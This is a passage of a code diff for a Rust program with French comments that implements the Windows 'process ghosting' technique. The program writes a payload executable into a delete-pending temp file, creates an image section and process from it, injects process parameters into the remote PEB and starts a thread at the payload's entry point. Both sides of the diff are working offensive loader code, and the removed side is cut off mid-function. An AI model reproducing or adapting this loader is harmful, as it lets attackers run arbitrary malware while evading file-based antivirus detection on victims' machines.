@@ -1,619 +1,507 @@
-//Référence : https://whokilleddb.github.io/blogs/posts/process-ghosting/
+// Process Ghosting en Rust — version intégrée de @5mukx
+// Corrections : imports FILE_MAP_READ, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, VirtualFree, MEM_DECOMMIT, LARGE_INTEGER, FILE_DISPOSITION_INFORMATION
 
 use std::{
-    env, ffi::{CString, OsStr}, fs, iter::once, mem::{size_of, zeroed}, os::windows::ffi::OsStrExt, path::Path, ptr::null_mut
+    env,
+    ffi::CString,
+    iter::once,
+    mem::{size_of, zeroed},
+    path::Path,
+    ptr::null_mut,
 };
 
 use winapi::{
     shared::{
-        minwindef::{DWORD, FALSE, LPCVOID, LPVOID},
+        minwindef::{FALSE, LPCVOID, LPVOID, MAX_PATH, TRUE},
         ntdef::{
-            HANDLE, NTSTATUS, NT_SUCCESS, NULL, PUNICODE_STRING, PVOID, UNICODE_STRING
+            InitializeObjectAttributes, HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, PUNICODE_STRING, PVOID, UNICODE_STRING
         },
-        ntstatus::{
-            STATUS_INVALID_PARAMETER, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_SUCCESS
-        },
+        ntstatus::{STATUS_INVALID_PARAMETER, STATUS_SUCCESS},
     },
     um::{
-        errhandlingapi::GetLastError, fileapi::{CreateFileA, GetFileSize, WriteFile, FILE_DISPOSITION_INFO, OPEN_ALWAYS, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, WriteProcessMemory, FILE_MAP_READ}, processthreadsapi::{GetCurrentProcess, GetExitCodeProcess, GetProcessId, ProcessIdToSessionId}, winbase::{CreateFileMappingA, INFINITE}, winnt::{
-            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE, THREAD_ALL_ACCESS
+        errhandlingapi::GetLastError, fileapi::{CreateFileA, GetFileSize, GetTempFileNameA, GetTempPathA}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree, WriteProcessMemory, FILE_MAP_READ}, processenv::GetCurrentDirectoryA, userenv::CreateEnvironmentBlock, winbase::CreateFileMappingA, winnt::{
+            DELETE, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_DECOMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE, THREAD_ALL_ACCESS
         }
     },
 };
 
-use ntapi::{ntioapi::{FileDispositionInformation, NtSetInformationFile, IO_STATUS_BLOCK}, ntmmapi::{NtCreateSection, NtMapViewOfSection, NtWriteVirtualMemory}, ntpsapi::{NtCreateProcess, NtCreateThreadEx, NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION, PS_ATTRIBUTE_LIST}, ntrtl::{RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS}};
-
-use winapi::um::synchapi::WaitForSingleObject;
+use ntapi::{
+    ntioapi::{FileDispositionInformation, NtOpenFile, NtSetInformationFile, NtWriteFile, FILE_DISPOSITION_INFORMATION, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, IO_STATUS_BLOCK, PIO_APC_ROUTINE},
+    ntmmapi::{NtCreateSection, NtReadVirtualMemory},
+    ntobapi::NtClose,
+    ntpebteb::{PEB, PPEB},
+    ntpsapi::{
+        NtCreateProcessEx, NtCreateThreadEx, NtCurrentPeb, NtCurrentProcess, NtQueryInformationProcess, NtTerminateProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION, PROCESS_CREATE_FLAGS_INHERIT_HANDLES
+    },
+    ntrtl::{RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
+            RTL_USER_PROC_PARAMS_NORMALIZED},
+};
 
 #[derive(Debug)]
-struct Error {
-    status: NTSTATUS,
+struct Error { status: NTSTATUS }
+impl From<NTSTATUS> for Error {
+    fn from(status: NTSTATUS) -> Self { Self { status } }
 }
 
-impl From<NTSTATUS> for Error {
-    fn from(status: NTSTATUS) -> Self {
-        Self { status }
+
+unsafe fn open_file(path: &str) -> Result<HANDLE, Error> {
+    let wide: Vec<u16> = format!("\\??\\{}", path).encode_utf16().chain(once(0)).collect();
+    let mut us = zeroed::<UNICODE_STRING>();
+    RtlInitUnicodeString(&mut us, wide.as_ptr());
+    let mut oa = zeroed::<OBJECT_ATTRIBUTES>();
+    InitializeObjectAttributes(&mut oa, &mut us, 0x40, NULL, NULL);
+    let mut iosb = zeroed::<IO_STATUS_BLOCK>();
+    let mut h_file: HANDLE = INVALID_HANDLE_VALUE;
+
+    let status = NtOpenFile(
+        &mut h_file,
+        DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
+        &mut oa,
+        &mut iosb,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
+    );
+    if !NT_SUCCESS(status) { 
+        println!("[!] Impossible d'ouvrir le fichier, status: 0x{:x}", status);
+        return Err(Error::from(status)); 
+    }
+    println!("[DBG] open_file a retourné handle={:?}", h_file);
+    Ok(h_file)
+}
+
+
+unsafe fn write_params_into_process(
+    process_handle: HANDLE,
+    params: PRTL_USER_PROCESS_PARAMETERS,
+) -> LPVOID {
+    if params == null_mut() {
+        return NULL;
+    }
+
+    let r_address = VirtualAllocEx(
+        process_handle,
+        params as *mut _,
+        (*params).Length as usize + (*params).EnvironmentSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    );
+    if r_address == NULL {
+        println!("[!] Echec de l'allocation RemoteProcessParams: {}", GetLastError());
+        return NULL;
+    }
+
+    if WriteProcessMemory(
+        process_handle,
+        params as *mut _,
+        params as *const _,
+        (*params).Length as usize,
+        null_mut(),
+    ) == FALSE {
+        println!("[!] Echec de l'écriture RemoteProcessParams: {}", GetLastError());
+        VirtualFree(r_address, 0, MEM_DECOMMIT);
+        return NULL;
+    }
+
+    if (*params).Environment != NULL {
+        if WriteProcessMemory(
+            process_handle,
+            (*params).Environment as *mut _,
+            (*params).Environment as *const _,
+            (*params).EnvironmentSize,
+            null_mut(),
+        ) == FALSE {
+            println!("[!] Echec de EnvironmentBlock: {}", GetLastError());
+            VirtualFree(r_address, 0, MEM_DECOMMIT);
+            return NULL;
+        }
+    }
+
+    params as *mut _
+}
+
+unsafe fn section_creation(
+    path: &str, 
+    payload: LPVOID,
+    size: u32
+) -> Result<HANDLE, Error> {
+
+    let h_file = open_file(path)?;
+    let mut iosb = zeroed::<IO_STATUS_BLOCK>();
+    let mut info = zeroed::<FILE_DISPOSITION_INFORMATION>();
+    info.DeleteFileA = 1;
+    let st = NtSetInformationFile(
+        h_file,
+        &mut iosb,
+        &mut info as *mut _ as *mut _,
+        size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
+        FileDispositionInformation,
+    );
+    
+    if !NT_SUCCESS(st) {
+        println!("Ïmpossible d'initialiser les informations fichiers 0x{:x}", st);
+        NtClose(h_file); 
+        return Err(Error::from(st)); }
+
+    let mut li = zeroed::<winapi::shared::ntdef::LARGE_INTEGER>();
+    let st = NtWriteFile(
+        h_file, 
+        NULL, 
+        zeroed::<PIO_APC_ROUTINE>(), 
+        NULL,
+        &mut iosb, 
+        payload,
+        size, 
+        &mut li, 
+        null_mut(),
+    );
+    if !NT_SUCCESS(st) { 
+        println!("[!] Impossible d'écrire le payload 0x{:x}", st);
+        NtClose(h_file); 
+        return Err(Error::from(st)); 
+    }
+    println!("[DBG] NtWriteFile OK, {} octets écrits", size);
+
+    let mut h_section: HANDLE = INVALID_HANDLE_VALUE;
+    let st = NtCreateSection(
+        &mut h_section, 
+        SECTION_ALL_ACCESS, 
+        null_mut(), 
+        null_mut(),
+        PAGE_READONLY, 
+        SEC_IMAGE, 
+        h_file,
+    );
+    NtClose(h_file);
+    if !NT_SUCCESS(st) { return Err(Error::from(st)); }
+    println!("[+] Succès de NtCreateSection");
+    Ok(h_section)
+}
+
+unsafe fn buffer_payload(path: &str) -> Option<(LPVOID, u32)> {
+    let cpath = CString::new(path).ok()?;
+    let h = CreateFileA(
+        cpath.as_ptr(),
+        winapi::um::winnt::GENERIC_READ,
+        FILE_SHARE_READ,
+        null_mut(),
+        winapi::um::fileapi::OPEN_EXISTING,
+        winapi::um::winnt::FILE_ATTRIBUTE_NORMAL,
+        null_mut(),
+    );
+    if h == INVALID_HANDLE_VALUE {
+        eprintln!("[!] CreateFileA Failed: {}", GetLastError());
+        return None;
+    }
+    let size = GetFileSize(
+        h, 
+        null_mut()
+    );
+    let map = CreateFileMappingA(
+        h, null_mut(),
+        PAGE_READONLY, 
+        0, 
+        0, 
+        null_mut());
+    let view = MapViewOfFile(map,
+         FILE_MAP_READ,
+         0,
+         0,
+         0
+        );
+    let buf = VirtualAlloc(NULL,
+        size as usize, 
+        MEM_COMMIT|MEM_RESERVE, 
+        PAGE_READWRITE
+    );
+    std::ptr::copy_nonoverlapping(view as *const u8, 
+        buf as *mut u8, 
+        size as usize
+    );
+    UnmapViewOfFile(view);
+    CloseHandle(map);
+    CloseHandle(h);
+    Some((buf, size))
+}
+
+#[inline]
+unsafe fn get_current_directory() -> String {
+    let mut cur_dir = String::with_capacity(MAX_PATH);
+    GetCurrentDirectoryA(MAX_PATH as u32, cur_dir.as_mut_ptr().cast());
+    cur_dir
+}
+
+#[inline]
+unsafe fn get_directory(path: &str) -> Option<&str> {
+    let path = Path::new(path);
+    match path.parent() {
+        Some(parent) => match parent.exists() {
+            true => parent.to_str(),
+            false => None,
+        },
+        None => None,
     }
 }
 
-#[repr(C)]
-struct CPInfo {
-    p_handle: HANDLE,
-    pb_info: PROCESS_BASIC_INFORMATION,
+unsafe fn setup_process(
+    process_handle: HANDLE,
+    pbi: PROCESS_BASIC_INFORMATION,
+    target_path: &str,
+) -> Result<(), Error> {
+    
+    let mut w_target: Vec<_> = target_path.encode_utf16().collect();
+    w_target.push(0x0);
+    let mut us_target = zeroed::<UNICODE_STRING>();
+    RtlInitUnicodeString(&mut us_target, w_target.as_ptr());
+
+    let cur_dir = get_current_directory();
+    let target_dir = get_directory(target_path).unwrap_or(cur_dir.as_str());
+    let mut w_target_dir: Vec<_> = target_dir.encode_utf16().collect();
+    w_target_dir.push(0x0);
+    let mut us_target_dir = zeroed::<UNICODE_STRING>();
+    RtlInitUnicodeString(&mut us_target_dir, w_target_dir.as_ptr());
+
+    let dll_dir = "C:\\Windows\\System32";
+    let mut wide_dll_dir: Vec<_> = dll_dir.encode_utf16().collect();
+    wide_dll_dir.push(0x0);
+    let mut us_dll_dir = zeroed::<UNICODE_STRING>();
+    RtlInitUnicodeString(&mut us_dll_dir, wide_dll_dir.as_ptr());
+
+    let window_name = target_path;
+    let mut wide_window_name: Vec<_> = window_name.encode_utf16().collect();
+    wide_window_name.push(0x0);
+    let mut us_window_name = zeroed::<UNICODE_STRING>();
+    RtlInitUnicodeString(&mut us_window_name, wide_window_name.as_ptr());
+
+    let mut env_block: LPVOID = null_mut();
+    let x = CreateEnvironmentBlock(&mut env_block, NULL, TRUE);
+    println!("[+] CreateEnvironmentBlock Success: {}", x);
+
+    let mut desktop_info: PUNICODE_STRING = null_mut();
+    let cur_proc_peb = NtCurrentPeb();
+    if cur_proc_peb != null_mut() && (*cur_proc_peb).ProcessParameters != null_mut() {
+        desktop_info = &mut (*(*cur_proc_peb).ProcessParameters).DesktopInfo;
+    }
+
+    let mut params: PRTL_USER_PROCESS_PARAMETERS = null_mut();
+    let status = RtlCreateProcessParametersEx(
+        &mut params,
+        &mut us_target,
+        &mut us_dll_dir,
+        &mut us_target_dir,
+        &mut us_target,
+        env_block,
+        &mut us_window_name,
+        desktop_info,
+        null_mut(),
+        null_mut(),
+        RTL_USER_PROC_PARAMS_NORMALIZED,
+    );
+    if !NT_SUCCESS(status) {
+        println!("[!] Echec de la création des paramètres du processus (RtlCreateProcessParametersEx) : 0x{:x}", status);
+        return Err(Error::from(status));
+    }
+
+    let remote_params = write_params_into_process(process_handle, params);
+    if remote_params == NULL {
+        println!("[!] Echec de l'écriture au processus distant");
+        return Err(Error::from(STATUS_INVALID_PARAMETER));
+    }
+
+    if !set_params_in_peb(remote_params as *mut _, process_handle, pbi.PebBaseAddress) {
+        return Err(Error::from(STATUS_INVALID_PARAMETER));
+    }
+
+    let remote_peb = buffer_remote_peb(process_handle, pbi)?;
+    println!(
+        "[+] Parameters Block Address distant: 0x{:x}",
+        remote_peb.ProcessParameters as usize
+    );
+
+    Ok(())
 }
 
-fn to_wide_null(s: &str) -> Vec<u16> {
-    OsStr::new(s).encode_wide().chain(once(0)).collect()
+unsafe fn set_params_in_peb(params: LPVOID, process_handle: HANDLE, remote_peb: PPEB) -> bool {
+    let to_pvoid = std::mem::transmute::<&PRTL_USER_PROCESS_PARAMETERS, LPVOID>(
+        &(*remote_peb).ProcessParameters,
+    );
+    let params_to_lpcvoid = std::mem::transmute::<&PVOID, LPCVOID>(&params);
+    if WriteProcessMemory(
+        process_handle,
+        to_pvoid,
+        params_to_lpcvoid,
+        size_of::<PVOID>(),
+        null_mut(),
+    ) == FALSE {
+        println!("[!] Cannot update parameters: {}", GetLastError());
+        return false;
+    }
+    true
 }
-// type de votre entrypoint
+unsafe fn buffer_remote_peb(
+    process_handle: HANDLE,
+    pbi: PROCESS_BASIC_INFORMATION,
+) -> Result<PEB, Error> {
+    let mut peb: PEB = zeroed();
+    let st = NtReadVirtualMemory(
+        process_handle,
+        pbi.PebBaseAddress as *mut _,
+        &mut peb as *mut _ as *mut _, //Alors la as mut as mut c'est de la magie noire
+        size_of::<PEB>(),
+        null_mut(),
+    );
+    if st != STATUS_SUCCESS {
+        return Err(Error::from(st));
+    }
+    println!(
+    "[DBG] Lecture du PEB distant: ImageBaseAddress=0x{:X}",
+    peb.ImageBaseAddress as usize
+    );
+    Ok(peb)
+}
+
+unsafe fn get_entry_point_rva(buf: LPVOID) -> Option<u32> {
+    let dos = buf as *const IMAGE_DOS_HEADER;
+    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
+        return None;
+    }
+    let nt_off = (*dos).e_lfanew as isize;
+    let nt = (buf as *const u8).offset(nt_off) as *const IMAGE_NT_HEADERS64;
+    if (*nt).Signature != IMAGE_NT_SIGNATURE {
+        return None;
+    }
+    Some((*nt).OptionalHeader.AddressOfEntryPoint)
+}
 
 unsafe fn create_remote_thread(
     h_process: HANDLE,
-    entry_addr: PVOID,
-    suspended: bool,
+    entry: PVOID,
 ) -> Result<HANDLE, Error> {
     let mut h_thread: HANDLE = null_mut();
-    let create_flags = if suspended { 
-        0x00000004 /* THREAD_CREATE_FLAGS_CREATE_SUSPENDED */ 
-    } else { 0 };
-
-    let status: NTSTATUS = unsafe { NtCreateThreadEx(
+    let st = NtCreateThreadEx(
         &mut h_thread,
         THREAD_ALL_ACCESS,
-        null_mut(),           // POBJECT_ATTRIBUTES
+        null_mut(),
         h_process,
-        entry_addr,        // PUSER_THREAD_START_ROUTINE
-        null_mut(),           // Argument
-        create_flags,
-        0,                    // ZeroBits
-        0,                    // StackSize
-        0,                    // MaximumStackSize
-        null_mut::<PS_ATTRIBUTE_LIST>(), // pas d’attributs
-    ) };
-    if status < 0 {
-        return Err(Error::from(status));
+        entry,
+        null_mut(),
+        0, 0, 0, 0,
+        null_mut(),
+    );
+    if !NT_SUCCESS(st) {
+        return Err(Error::from(st));
     }
     Ok(h_thread)
 }
 
-/// Construit en mémoire locale la structure RTL_USER_PROCESS_PARAMETERS
-///    avec RtlCreateProcessParametersEx. Retourne un pointeur vers la structure.
-unsafe fn build_process_parameters(
-    image_path: &str,
-    command_line: &str,
-) -> Option<PRTL_USER_PROCESS_PARAMETERS> {
-    // Chaînes wide
-    let image_w = to_wide_null(image_path);
-    let cmd_w   = to_wide_null(command_line);
 
-    // Initialisation des UNICODE_STRING
-    let mut us_image: UNICODE_STRING = unsafe { std::mem::zeroed() };
-    unsafe { RtlInitUnicodeString(&mut us_image as PUNICODE_STRING, image_w.as_ptr()) };
 
-    let mut us_cmd: UNICODE_STRING = unsafe { std::mem::zeroed() };
-    unsafe { RtlInitUnicodeString(&mut us_cmd as PUNICODE_STRING, cmd_w.as_ptr()) };
-
-    // Créer la structure
-    let mut p_params: PRTL_USER_PROCESS_PARAMETERS = null_mut(); 
-    let status = unsafe { RtlCreateProcessParametersEx(
-        &mut p_params,
-        &mut us_image,
-        null_mut(),        // DLL path
-        null_mut(),        // Current directory
-        &mut us_cmd,
-        null_mut(),        // Environment (NULL = hérite)
-        null_mut(), null_mut(), null_mut(), null_mut(),
-        0,                 // Flags (pas de RTL_USER_PROC_PARAMS_NORMALIZED)
-    ) };
-    if status != STATUS_SUCCESS {
-        eprintln!("[!] RtlCreateProcessParametersEx a échoué : 0x{:X}", status as u32);
-        return None;
-    }
-    Some(p_params)
-}
-
-/// 2) Injecte ces process parameters dans le process enfant et met à jour le PEB
-unsafe fn inject_process_parameters(
-    h_process: HANDLE,
-    pbi: &PROCESS_BASIC_INFORMATION,
-    p_params: PRTL_USER_PROCESS_PARAMETERS, // en réalité *mut RTL_USER_PROCESS_PARAMETERS
-) -> Result<PVOID, Error> {
-    // Taille de la structure
-    let params_size = (unsafe { *p_params }).MaximumLength as usize;
-    // Allouer dans l'espace du process
-    let remote_addr = unsafe { VirtualAllocEx(
-        h_process,
-        null_mut(),
-        params_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    ) };
-    if remote_addr.is_null() {
-        return Err(Error::from(STATUS_INVALID_PARAMETER));
-    }
-
-    // Copier la structure
-    let mut written: usize = 0;
-    let ok = unsafe { WriteProcessMemory(
-        h_process,
-        remote_addr,
-        p_params as *const _,
-        params_size,
-        &mut written as *mut usize,
-    ) };
-    if ok == FALSE || written != params_size {
-        return Err(Error::from(STATUS_INVALID_PARAMETER));
-    }
-
-    // Calcul de l’adresse du champ ProcessParameters dans le PEB
-    const PROCESS_PARAMETERS_OFFSET: usize = if cfg!(target_pointer_width = "64") { 0x20 } else { 0x10 };
-    let peb_addr = (pbi.PebBaseAddress as usize).checked_add(PROCESS_PARAMETERS_OFFSET)
+unsafe fn process_ghosting(target_path: &str, payload_path: &str,) -> Result<(), Error> {
+    
+    println!("[*] Lecture du payload : {}", payload_path);
+    let (buf, size) = buffer_payload(payload_path)
         .ok_or_else(|| Error::from(STATUS_INVALID_PARAMETER))?;
 
-    // Écrire le pointeur remote_addr dans le PEB du process enfant
-    let status = unsafe { NtWriteVirtualMemory(
-        h_process,
-        peb_addr as PVOID,
-        &remote_addr as *const _ as PVOID,
-        std::mem::size_of::<PVOID>() as usize,
+    println!("[+] Payload buffer@{:p}, size={} bytes", buf, size as usize);
+    
+    let mut temp_path: [u8; MAX_PATH] = [0; MAX_PATH];
+    GetTempPathA(MAX_PATH as u32, temp_path.as_mut_ptr() as _);
+    let mut dummy_name: [u8; MAX_PATH] = [0; MAX_PATH];
+    GetTempFileNameA(
+        temp_path.as_ptr() as _,
+        "Demo".as_ptr() as _,
+        0,
+        dummy_name.as_mut_ptr() as _,
+    );
+    let temp_path_str = String::from_utf8(dummy_name.to_vec())
+        .unwrap_or_default()
+        .trim_end_matches('\0')
+        .to_string();
+    println!("[+] Fichier temporaire créé dans : {}", temp_path_str);
+
+    let h_section = section_creation(&temp_path_str, buf, size)?;
+    println!("[DBG] Section image créée: h_section={:?}", h_section);
+    
+    let mut h_process: HANDLE = INVALID_HANDLE_VALUE;
+    let status = NtCreateProcessEx(
+        &mut h_process,
+        PROCESS_ALL_ACCESS,
         null_mut(),
-    ) };
-    if status < 0 {
+        NtCurrentProcess,
+        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
+        h_section,
+        null_mut(),
+        null_mut(),
+        0,
+    );
+    
+    if !NT_SUCCESS(status) {
         return Err(Error::from(status));
     }
-
-    Ok(remote_addr)
-}
-unsafe fn create_process(h_section: HANDLE) -> Option<*mut CPInfo> {
-    // 1) allouer et zero-initialiser la structure CPInfo
-    let p_info: *mut CPInfo = Box::into_raw(Box::new(unsafe { zeroed::<CPInfo>() }));
-    if p_info.is_null() {
-        eprintln!("[!] Impossible d'allouer CPInfo");
-        return None;
-    }
-
-    // 2) appel à NtCreateProcess
-    let status = unsafe { NtCreateProcess(
-        &mut (*p_info).p_handle,
-        PROCESS_ALL_ACCESS,
-        null_mut(),               // ObjectAttributes
-        GetCurrentProcess(),      // ParentProcess
-        1,                        // InheritObjectTable = TRUE
-        h_section,                // SectionHandle
-        null_mut(),               // DebugPort
-        null_mut(),               // ExceptionPort
-    ) };
-    if status < 0 {
-        eprintln!("[!] NtCreateProcess a échoué : 0x{:X}", status as u32);
-        // cleanup
-        unsafe { let _ = Box::from_raw(p_info); };
-        return None;
-    }
-
-    // 3) requête des informations de base du process
-    let status = unsafe { NtQueryInformationProcess(
-        (*p_info).p_handle,
-        ProcessBasicInformation,
-        &mut (*p_info).pb_info as *mut _ as *mut _,
-        std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-        null_mut(),
-    ) };
-    if status < 0 {
-        eprintln!("[!] NtQueryInformationProcess a échoué : 0x{:X}", status as u32);
-        unsafe { CloseHandle((*p_info).p_handle) };
-        unsafe { let _ = Box::from_raw(p_info); };
-        return None;
-    }
-
-    // 4) affichage du PID pour confirmation
-    let pid = unsafe { GetProcessId((*p_info).p_handle) };
-    println!("[+] Process ghosted créé, PID = {}", pid);
-let mut session_id = 0u32;
-
-unsafe { ProcessIdToSessionId(pid, &mut session_id) };
-println!("[+] SessionId du ghosted : {}", session_id);
-    Some(p_info)
-}
-
-/// Mappe la section dans le processus courant et retourne l'adresse de base + taille.
-unsafe fn map_section_local(
-    h_section: HANDLE,
-) -> Option<(LPVOID, usize)> {
-    let mut base_address: LPVOID = null_mut();
-    let mut view_size: usize = 0;
-
-    // InheritDisposition = 1 (ViewShare), AllocationType = 0, Win32Protect = PAGE_READONLY
-    let status: NTSTATUS = unsafe { NtMapViewOfSection(
-        h_section,
-        GetCurrentProcess(),
-        &mut base_address as *mut LPVOID,
-        0,
-        0,
-        null_mut(),
-        &mut view_size as *mut usize,
-        1,
-        0,
-        PAGE_READONLY,
-    ) };
-
-    if !NT_SUCCESS(status) {
-        eprintln!("[!] NtMapViewOfSection (local) a échoué : 0x{:X}", status as u32);
-        return None;
-    }
-
-    println!(
-        "[+] Section mappée localement à {:p}, taille 0x{:X}",
-        base_address, view_size
-    );
-    Some((base_address, view_size))
-}
-
-/// Mappe la section dans l’espace mémoire du processus enfant et retourne l'adresse de base distante.
-unsafe fn map_section_remote(
-    h_section: HANDLE,
-    h_process: HANDLE,
-) -> Option<LPVOID> {
-    let mut remote_base: LPVOID = null_mut();
-    let mut view_size: usize = 0;
-
-    let status: NTSTATUS = unsafe { NtMapViewOfSection(
-        h_section,
+    println!("[DBG] Process ghosted créé: h_process={:?}", h_process);
+    let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
+    let st = NtQueryInformationProcess(
         h_process,
-        &mut remote_base as *mut LPVOID,
+        ProcessBasicInformation,
+        &mut pbi as *mut _ as *mut _,
+        size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+        &mut zeroed::<u32>(),
+    );
+    if !NT_SUCCESS(st) {
+        NtTerminateProcess(h_process, 0);
+        return Err(Error::from(st));
+    }
+    println!("[*] PID du ghosted process : PID {}", pbi.UniqueProcessId as u32);
+
+    let peb = buffer_remote_peb(h_process, pbi)?;
+    println!(
+        "[DBG] ImageBaseAddress distant = 0x{:X}",
+        peb.ImageBaseAddress as usize
+    );
+
+    let ep_rva = get_entry_point_rva(buf).expect("[!] Echec payload Image Entry point");        
+    println!("[+] Entry Point Offset: 0x{:x}", ep_rva);
+    
+    let proc_entry = peb.ImageBaseAddress as u64 + ep_rva as u64;
+            println!("[+] Ghost Process Entry Point: 0x{:x}", proc_entry);
+
+
+    let setup = setup_process(h_process, pbi, target_path)?;
+    println!("[+] La fonction setup_process_parameters OK {:?}" ,setup);
+    let mut thread_handle: HANDLE = INVALID_HANDLE_VALUE;
+    let status = NtCreateThreadEx(
+        &mut thread_handle,
+        THREAD_ALL_ACCESS,
+        null_mut(),
+        h_process,
+        proc_entry as *mut _,
+        null_mut(),
+        0,
+        0,
         0,
         0,
         null_mut(),
-        &mut view_size as *mut usize,
-        1,
-        0,
-        PAGE_READONLY,
-    ) };
-
+    );
     if !NT_SUCCESS(status) {
-        eprintln!("[!] NtMapViewOfSection (remote) a échoué : 0x{:X}", status as u32);
-        return None;
+        println!("[!] Thread Create Failed: 0x{:x}", status);
+        NtTerminateProcess(h_process, 0);
+        return Err(Error::from(status));
     }
-
-    println!(
-        "[+] Section mappée dans l'enfant à {:p} (taille 0x{:X})",
-        remote_base, view_size
-    );
-    Some(remote_base)
-}
-
-
-unsafe fn get_nt_headers (base_addr:LPVOID) -> LPVOID{
-    //let dos_hdr = unsafe { &*(base_addr as *const IMAGE_DOS_HEADER) };
-    let idos_hdr = base_addr as *const IMAGE_DOS_HEADER;
-    
-    if (unsafe { *idos_hdr }).e_magic != IMAGE_DOS_SIGNATURE {
-        println!("[*] Signature DOS invalide");
-        return NULL;
-    }
-    const MAX_OFFSET: i32 = 1024;
-    let offset = (unsafe { *idos_hdr }).e_lfanew;
-    if offset > MAX_OFFSET {
-        return NULL;
-    }
-    let inh = (base_addr as usize + offset as usize) as *const IMAGE_NT_HEADERS64; //P-e prendre en charge aussi 32 bits ? 
-    if (unsafe { *inh }).Signature != IMAGE_NT_SIGNATURE {
-        return NULL;
-    }
-    inh as LPVOID
-}
-
-unsafe fn get_ep_rva (base_addr:LPVOID) -> u32{
-    let nt_hdr = unsafe { get_nt_headers(base_addr) };
-    if nt_hdr == NULL {
-        return 0;
-    }
-    let nt_hdr = nt_hdr as *const IMAGE_NT_HEADERS64;//P-e prendre en charge aussi 32 bits ? 
-    return unsafe { *nt_hdr }.OptionalHeader.AddressOfEntryPoint;
-}
-
-unsafe fn read_payload(payload:&str) ->Option<(PVOID,u32)>{
-    let c_path = match CString::new(payload) {
-        Ok(s) => s,
-        Err(_) => { eprintln!("[!] Chemin invalide"); return None; }
-    };
-    let h_file = unsafe{ CreateFileA(
-        c_path.as_ptr(),
-        GENERIC_READ,
-        FILE_SHARE_READ,
-        null_mut(),
-        OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL,
-        null_mut(),
-    )};
-    if h_file == INVALID_HANDLE_VALUE {
-        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
-        return None;
-    }
-    println!("[+] Ouverture du payload en lecture Ok");
-    
-    let h_map = unsafe { CreateFileMappingA(
-        h_file,
-        null_mut(), 
-        PAGE_READONLY,
-        0, 
-        0, 
-        null_mut())
-    };
-    if h_map == INVALID_HANDLE_VALUE {
-        println!("[!] CreateFileMappingA Failed: {}", unsafe{GetLastError()});
-        unsafe{CloseHandle(h_file)};
-        return None;
-    }
-    println!("[+] CreateFileMappingA Ok");
-
-    let mapped_addr = unsafe { MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0) };
-    if mapped_addr == NULL {
-        println!("[!] MapViewOfFile Failed: {}", unsafe{GetLastError()});
-        unsafe { 
-            CloseHandle(h_map);
-            CloseHandle(h_file);
-        };
-        return None;
-    }
-    println!("[+] MapViewOfFile Ok");
-
-    let file_size = unsafe { GetFileSize(h_file, null_mut()) };
-    let payload_raw = unsafe { VirtualAlloc(
-        NULL,
-        file_size as usize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    ) };
-    if payload_raw == NULL {
-        println!("[!] VirtualAlloc Failed: {}",  unsafe{GetLastError()});
-        unsafe { 
-            UnmapViewOfFile(mapped_addr);
-            CloseHandle(h_map);
-            CloseHandle(h_file);
-    };
-        return None;
-    }
-    println!("[+] On a lu le payload, taille: 0x{:x}", file_size);
-
-    unsafe { std::ptr::copy_nonoverlapping(
-        mapped_addr as *const u8,
-        payload_raw as *mut u8,
-        file_size as usize,
-        ) 
-    };
-    println!("[+] Payload copié !");
-
-    unsafe { 
-        UnmapViewOfFile(mapped_addr);
-        CloseHandle(h_map);
-        CloseHandle(h_file);
-    };
-    Some((payload_raw,file_size))
-
-}
-
-unsafe fn write_payload(h_file:&HANDLE,payload_bytes:LPVOID,payload_size:u32) -> Option<PVOID>{
-    let mut b_written: DWORD = 0;
-    let ok = unsafe { WriteFile(
-        *h_file,
-        payload_bytes as LPCVOID,
-        payload_size,
-        &mut b_written,
-        null_mut(),
-    ) };
-    if ok == FALSE {
-        println!("[!] J'ai pas su écrire le payload dans le fichier temporaire (0x{:X})", unsafe { GetLastError() });
-        return None;
-    }
-
-    let mut h_section: HANDLE = null_mut();
-    let status = unsafe { NtCreateSection(
-        &mut h_section,
-        SECTION_ALL_ACCESS,
